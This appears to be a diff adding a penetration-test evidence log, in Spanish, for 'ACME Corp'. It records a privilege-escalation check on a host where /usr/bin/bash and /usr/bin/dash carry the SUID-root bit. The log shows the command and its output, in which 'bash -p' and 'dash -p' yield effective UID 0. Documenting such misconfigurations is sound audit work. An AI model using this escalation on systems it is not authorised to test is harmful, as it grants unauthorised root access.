@@ -1,0 +1,24 @@
+================================================================
+ ACME Corp — Evidencia de auditoría
+ Fecha (UTC) : 2026-10-18T04:09:22Z
+ Objetivo    : 172.17.0.2
+ Fase        : Vector A — Escalada via bit SUID en /usr/bin/bash
+ Comando     : echo '=== permisos de /usr/bin/bash ==='; ls -la /usr/bin/bash /usr/bin/dash; stat -c '%n %A %U:%G %a' /usr/bin/bash /usr/bin/dash; echo; echo '=== bash SIN -p (euid restablecido) ==='; /usr/bin/bash -c 'id; echo euid=$(id -u)'; echo; echo '=== bash CON -p (euid conservado) ==='; /usr/bin/bash -p -c 'id; echo euid=$(id -u)'; echo; echo '=== dash CON -p ==='; /usr/bin/dash -p -c 'id'
+================================================================
+
+=== permisos de /usr/bin/bash ===
+-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /usr/bin/bash
+-rwsr-xr-x 1 root root  125688 Mar 23  2022 /usr/bin/dash
+/usr/bin/bash -rwsr-xr-x root:root 4755
+/usr/bin/dash -rwsr-xr-x root:root 4755
+
+=== bash SIN -p (euid restablecido) ===
+uid=1000(usuario) gid=1000(usuario) groups=1000(usuario)
+euid=1000
+
+=== bash CON -p (euid conservado) ===
+uid=1000(usuario) gid=1000(usuario) euid=0(root) groups=1000(usuario)
+euid=0
+
+=== dash CON -p ===
+uid=1000(usuario) gid=1000(usuario) euid=0(root) groups=1000(usuario)
